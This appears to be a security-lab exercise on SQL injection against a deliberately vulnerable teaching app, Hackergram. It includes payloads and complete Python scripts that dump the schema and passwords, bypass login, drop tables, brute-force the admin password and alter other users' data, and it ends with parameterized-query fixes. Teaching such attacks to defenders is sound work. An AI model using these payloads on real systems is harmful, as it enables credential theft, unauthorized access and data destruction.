# SQL Injection

## Objective

This experiment demonstrates how Hackergram's database queries, built with Python's `%` string formatting
instead of parameterized statements, let an attacker read the database schema, dump credentials, bypass
authentication, tamper with other users' data, and destroy tables, using only the `/posts`, `/users`,
`/login`, and `/settings` endpoints.

## Affected Hackergram functionality

- `/posts`:  post search (`search` query parameter)
- `/users`:  user search (`search` query parameter)
- `/login`:  username/password authentication
- `/settings`:  profile update (`username`, `name`, `bio` fields)

## Prerequisites

Simple/local deployment is sufficient: none of the sub-attacks below need the LLM stack or GNS3. Some
variants use a Python script run from the attacker machine (`requests` + `beautifulsoup4`).

## Initial state

Run `/reset` first. Each script registers and logs in its own throwaway user (`mallory` / `eve123`), so no
specific user needs to be logged in beforehand. The authentication-bypass sub-attack targets the `admin`
account without knowing its password.

## Vulnerable implementation

In Hackergram, `views.py` reads form fields and query parameters and passes them into `models.py`. The
weakness is consistent across every endpoint below: SQL is built with Python's `%` formatting, so user input
becomes part of the query *text* rather than a bound value.

| What you test in the lab | In `views.py` | In `models.py` |
|--------------------------|---------------|----------------|
| Login bypass | `user = models.login(username, password)` after reading `request.form` | `login()` |
| Search `/posts`, union/boolean/time-based | `posts = models.get_posts(query)` | `get_posts()` |
| Profile `UPDATE` | `models.update_user_settings(username, new_name, ...)` from `/settings` | `update_user_settings()` |

The clearest example is `update_user_settings()` in `models.py`:

```python
# Updates user
def update_user_settings(username, name, password, bio, photo):
    query = "UPDATE Users"
    query += " SET username='%s', password='%s', name='%s', bio='%s', photo='%s'" % (username, password, name, bio, photo)
    query += " WHERE username = '%s'" % (username)

    commit_to_database(query)
    return User(username, password, name, bio, photo)
```

## Experiment

### Error-based SQLi

Obtain information on the database software and schema. First, inject an apostrophe (`'`) in the search
field of the `/users` or `/posts` endpoints. An error message will be displayed disclosing that the software
is MySQL. Next, to obtain the database schema, inject the following instruction in the search field of the
`/posts` endpoint (it uses union-based injection):

```
' UNION SELECT '1', TABLE_NAME, '1', '1', COLUMN_NAME, table_schema FROM INFORMATION_SCHEMA.COLUMNS --
```

You will learn that the database has four tables (Users, Requests, Posts, and Friends), and which columns
each has. To obtain a more structured output, run this script at the attacker:

<details>
<summary><strong>💡 Script: dump DB version and schema</strong></summary>

```py
# Gets DB version and DB schema (Search Posts)

import requests
import sys
from bs4 import BeautifulSoup

def reset(session):
    session.get(SERVER+"/reset")

def register(session):
    payload = {
        'username': "mallory",
        'name': "Mallory",
        'password': "eve123"
    }
    session.post(SERVER+"/signup", data=payload)

def login(session):
    payload = {
        'username': "mallory",
        'password': "eve123"
    }
    session.post(SERVER+"/login", data=payload)

def exploit(session):
    payload = {
        'search' : "' UNION SELECT -- "
    }
    r = session.get(SERVER+"/posts", params=payload)
    soup = BeautifulSoup(r.text, 'html.parser')
    h4 = soup.find('h4').text
    print("Error message:")
    print(h4)
    if "MySQL" in h4:
        print("\nDatabase is powered by MySQL")
    else:
        print("\nFailed to identify Database version")
    print("--------------------------------------\n")
    print("(Table : Column)\n")
    payload = {
        'search' : "' UNION SELECT '1', TABLE_NAME, '1', '1', COLUMN_NAME, table_schema FROM INFORMATION_SCHEMA.COLUMNS -- "
    }
    r = session.get(SERVER+"/posts", params=payload)
    soup = BeautifulSoup(r.text, 'html.parser')
    cards = soup.find_all(class_='card')
    for card in cards:
        href = card.find(class_='profile')
        if href and 'href' in href.attrs:
            table = href['href'].split('username=')[1]
            db_name = card.find(class_='card-text h6').text.strip()
            if db_name == "(hackergramdb)":
                column = card.find(class_='card-text h5').text.strip()
                print(f"{table} : {column}")


if __name__ == '__main__':
    host = '192.168.0.100' if len(sys.argv) < 2 else sys.argv[1]
    port = '80' if len(sys.argv) < 3 else sys.argv[2]
    SERVER = "http://" + host + ":" + port
    print(SERVER)
    print("--------------------------------------\n")
    with requests.session() as s:
        reset(s)
        register(s)
        login(s)
        exploit(s)
```

</details>

### Authentication bypass

Log in as `admin` without knowing its password. In the `/login` endpoint, inject:

```
admin' and 1=1 --
```

**Why it works:** the query becomes `SELECT * FROM Users WHERE username='admin' and 1=1 -- ' AND
password='anything'`. The `--` comments out the password check, and `1=1` is always true.

### Union-based SQLi

Dump all users and passwords from the database.

**Manual, via the `/posts` search field:**

```
' UNION SELECT '1', username, password, '1', '1', '1' FROM Users --
```

or, for better formatting:

```
' UNION SELECT '1', CONCAT(username, ':', password), '1', '1', '1', '1' FROM Users --
```

<details>
<summary><strong>💡 Script: automated dump</strong></summary>

```py
import requests
import sys
import re

def dump_users(session):
    payload = "' UNION SELECT '1', CONCAT(username, '|', password, '|', name), '1', '1', '1', '1' FROM Users -- "
    r = session.get(SERVER+"/posts", params={"search": payload})

    # Extract user data from response
    users = re.findall(r'([^|]+)\|([^|]+)\|([^|]+)', r.text)

    print("Dumped Users:")
    print("-" * 50)
    for username, password, name in users:
        print(f"Username: {username}")
        print(f"Password: {password}")
        print(f"Name: {name}")
        print("-" * 30)

if __name__ == '__main__':
    host = '192.168.0.100' if len(sys.argv) < 2 else sys.argv[1]
    port = '80' if len(sys.argv) < 3 else sys.argv[2]
    SERVER = "http://" + host + ":" + port

    with requests.session() as s:
        register(s)
        login(s)
        dump_users(s)
```

</details>

### Piggybacked SQLi

Use piggybacked SQLi to delete one table from Hackergram's database.

!!! warning "This will permanently delete data!"
    Run `/reset` afterwards. Don't drop the `Users` table, because it will break authentication, including your own.

**Method 1: Drop table via search injection, in the `/posts` search field:**

```
test'; DROP TABLE Friends; --
```

Other valid targets: `Requests`, `Posts`.

**Method 2: Python script approach**

```py
import requests
import sys

def delete_table(session, table_name):
    payload = f"test'; DROP TABLE {table_name}; -- "
    r = session.get(SERVER+"/posts", params={"search": payload})
    print(f"Attempted to drop table: {table_name}")
    return r

def verify_deletion(session, table_name):
    # Try to query the deleted table
    test_payload = f"' UNION SELECT '1', '1', '1', '1', '1', '1' FROM {table_name} -- "
    r = session.get(SERVER+"/posts", params={"search": test_payload})
    if "doesn't exist" in r.text or "Unknown table" in r.text:
        print(f"Table {table_name} successfully deleted!")
    else:
        print(f"Table {table_name} still exists")

if __name__ == '__main__':
    host = '192.168.0.100' if len(sys.argv) < 2 else sys.argv[1]
    port = '80' if len(sys.argv) < 3 else sys.argv[2]
    SERVER = "http://" + host + ":" + port

    with requests.session() as s:
        register(s)
        login(s)
        delete_table(s, "Friends")
        verify_deletion(s, "Friends")
```

**What happens:** the query becomes `SELECT * FROM Posts WHERE content LIKE '%test'; DROP TABLE Friends;
-- %'` which means two statements run back to back: the original `SELECT` and the injected `DROP TABLE`.

### Boolean-based and time-based SQLi

Brute-force the admin password character by character via the `/posts` search field, without ever seeing an
error message or a direct dump.

<details>
<summary><strong>💡 Script: boolean-based</strong></summary>

```py
import requests
import sys
import string

def reset(session):
    session.get(SERVER+"/reset")

def register(session):
    payload = {
        'username': "mallory",
        'name': "Mallory",
        'password': "eve123"
    }
    session.post(SERVER+"/signup", data=payload)

def login(session):
    payload = {
        'username': "mallory",
        'password': "eve123"
    }
    session.post(SERVER+"/login", data=payload)

def exploit(session):
    base = "test' OR username='{user}' AND substr(password, {pos}, 1)='{char}' -- "
    user = 'admin'
    password = ""
    all_chars = string.ascii_letters + string.digits + string.punctuation
    for pos in range(1, 33):
        found = False
        for char in all_chars:
            payload = base.format(user=user, pos=pos, char=char)
            r = session.get(SERVER+"/posts", params={"search": payload})
            if "0 matches" not in r.text:
                print(f"Found character: {char}")
                password += char
                found = True
                break
        if not found:
            break
    print(f"\nPassword found for {user}: {password}")


if __name__ == '__main__':
    host = '192.168.0.100' if len(sys.argv) < 2 else sys.argv[1]
    port = '80' if len(sys.argv) < 3 else sys.argv[2]
    SERVER = "http://" + host + ":" + port
    print(SERVER)
    print("--------------------------------------\n")
    with requests.session() as s:
        reset(s)
        register(s)
        login(s)
        exploit(s)
```

</details>

!!! note "Additional exercise"

    Modify the script to obtain the same information using a time-based injection technique

<details>
<summary><strong>💡 Script: time-based</strong></summary>

```py
import requests
import sys
import string
import time

def reset(session):
    session.get(SERVER+"/reset")

def register(session):
    payload = {
        'username': "mallory",
        'name': "Mallory",
        'password': "eve123"
    }
    session.post(SERVER+"/signup", data=payload)

def login(session):
    payload = {
        'username': "mallory",
        'password': "eve123"
    }
    session.post(SERVER+"/login", data=payload)

def time_based_exploit(session):
    base = "test' OR (username='{user}' AND substr(password, {pos}, 1)='{char}' AND SLEEP(3)) -- "
    user = 'admin'
    password = ""
    all_chars = string.ascii_letters + string.digits + string.punctuation

    for pos in range(1, 33):
        found = False
        for char in all_chars:
            payload = base.format(user=user, pos=pos, char=char)
            start_time = time.time()
            r = session.get(SERVER+"/posts", params={"search": payload})
            end_time = time.time()

            # If response took longer than 2.5 seconds, we found the character
            if (end_time - start_time) > 2.5:
                print(f"Found character: {char}")
                password += char
                found = True
                break
        if not found:
            break
    print(f"\nPassword found for {user}: {password}")

if __name__ == '__main__':
    host = '192.168.0.100' if len(sys.argv) < 2 else sys.argv[1]
    port = '80' if len(sys.argv) < 3 else sys.argv[2]
    SERVER = "http://" + host + ":" + port
    print(SERVER)
    print("Time-based SQLi Attack")
    print("--------------------------------------\n")
    with requests.session() as s:
        reset(s)
        register(s)
        login(s)
        time_based_exploit(s)
```

</details>

### Changing another user's profile

Given `update_user_settings()` above, inject an instruction that changes the bio field of the `dpr` user to
`"user was pwned"`.

**In your own bio field:**

```
normal bio'; UPDATE Users SET bio='user was pwned' WHERE username='dpr'; --
```

<details>
<summary><strong>💡 Script: automated profile attack</strong></summary>

```py
import requests
import sys

def reset(session):
    session.get(SERVER+"/reset")

def register(session):
    payload = {
        'username': "mallory",
        'name': "Mallory",
        'password': "eve123"
    }
    session.post(SERVER+"/signup", data=payload)

def login(session):
    payload = {
        'username': "mallory",
        'password': "eve123"
    }
    session.post(SERVER+"/login", data=payload)

def exploit_profile(session):
    # Malicious payload in bio field
    malicious_bio = "normal bio'; UPDATE Users SET bio='user was pwned' WHERE username='dpr'; -- "

    payload = {
        'username': 'mallory',
        'name': 'Mallory',
        'password': 'eve123',
        'bio': malicious_bio,
        'photo': ''
    }

    r = session.post(SERVER+"/settings", data=payload)
    print("Profile update sent with malicious payload")
    return r

def verify_attack(session):
    # Check if dpr's bio was changed
    r = session.get(SERVER+"/users")
    if "user was pwned" in r.text:
        print("Attack successful! DPR's bio was changed.")
    else:
        print("Attack failed or bio not visible.")

if __name__ == '__main__':
    host = '192.168.0.100' if len(sys.argv) < 2 else sys.argv[1]
    port = '80' if len(sys.argv) < 3 else sys.argv[2]
    SERVER = "http://" + host + ":" + port
    print(SERVER)
    print("Profile SQLi Attack")
    print("--------------------------------------\n")
    with requests.session() as s:
        reset(s)
        register(s)
        login(s)
        exploit_profile(s)
        verify_attack(s)
```

</details>

**Alternative payloads:** change password: `'; UPDATE Users SET password='hacked' WHERE username='dpr'; -- `;
change username: `'; UPDATE Users SET username='pwned_dpr' WHERE username='dpr'; -- `; delete user: `';
DELETE FROM Users WHERE username='dpr'; -- `.

## Expected result

- Error-based: a MySQL error banner appears, followed by a listing of `(table : column)` pairs for the
  `hackergramdb` schema.
- Auth bypass: you land on the `admin` dashboard/home page without ever supplying the real password.
- Union-based: the posts feed shows fabricated "posts" whose content is actually `username:password` pairs.
- Piggybacked: a subsequent query against the dropped table returns a "doesn't exist"/"Unknown table" error.
- Boolean/time-based: the script prints a full recovered password for `admin`, one character at a time.
- Profile injection: `dpr`'s bio, visible from `/users`, reads `user was pwned`.

## Why it works

Every query above is built with `%` string formatting instead of parameterized queries, so anything the
attacker puts in `search`, `username`, `login`, or `bio` becomes part of the SQL statement itself rather than
a literal value. `--` comments out the rest of the original query, and `UNION SELECT` lets an attacker splice
arbitrary rows into a result set the template already knows how to render.

## Reset / cleanup

Run `/reset` to restore the database, especially after the piggybacked (`DROP TABLE`) and profile-tampering
sub-attacks.

## Inspect and modify

The fix is to keep the SQL shape fixed and pass values as bound parameters in `cursor.execute(sql, tuple)`
instead of formatting them into the query string.

**Fix `login()` in `models.py`** (stops authentication bypass):

```python
def login(username, password):
    sql = "SELECT * FROM Users WHERE username = %s AND password = %s"
    con = mysql.connection.cursor()
    con.execute(sql, (username, password))
    mysql.connection.commit()
    data = con.fetchall()
    con.close()
    if len(data) == 1:
        return User(*(data[0]))
    return None
```

Payloads like `admin' AND 1=1 -- ` are then treated as the **literal** username, not SQL syntax.

**Fix `get_posts()` in `models.py`** (stops search / `UNION` / inference tricks on `/posts`):

```python
def get_posts(search):
    sql = (
        "SELECT Posts.id, Users.username, Users.name, Users.photo, Posts.content, Posts.posted_at "
        "FROM Posts INNER JOIN Users ON Posts.author = Users.username "
        "WHERE Posts.content LIKE %s"
    )
    pattern = f"%{search}%"
    con = mysql.connection.cursor()
    con.execute(sql, (pattern,))
    mysql.connection.commit()
    data = con.fetchall()
    con.close()
    ...
```

Apply the same pattern anywhere else you see `LIKE '%%%s%%'` (for example `get_users`, `get_friends`).

**Fix `update_user_settings()` in `models.py`** (stops piggybacked `UPDATE` in profile fields):

```python
def update_user_settings(username, name, password, bio, photo):
    sql = (
        "UPDATE Users SET username=%s, password=%s, name=%s, bio=%s, photo=%s "
        "WHERE username=%s"
    )
    con = mysql.connection.cursor()
    con.execute(sql, (username, password, name, bio, photo, username))
    mysql.connection.commit()
    con.close()
```

Apply the same fix to it, repeat the attacks above, and confirm every payload now fails.

Two more things worth doing while you're in there: give the app's DB account only the rights it needs (no
`DROP` / file read), so a missed piggybacked statement does less damage; and stop the `error()` helper in
`views.py` from echoing exception text to the browser. Log details server-side and show users a generic
message instead (this is what makes error-based SQLi so easy in the first place).

## Exercise

Using `update_user_settings()`, find at least one other field (besides `bio`) that can be used to inject
SQL, and use it to change a different user's password.

## Hint

<details>
<summary>💡 Hint</summary>

The `name` field goes through the same unparameterized `UPDATE` statement as `bio`, so a payload of the form
`Mallory'; UPDATE Users SET password='hacked' WHERE username='dpr'; --` works the same way.

</details>
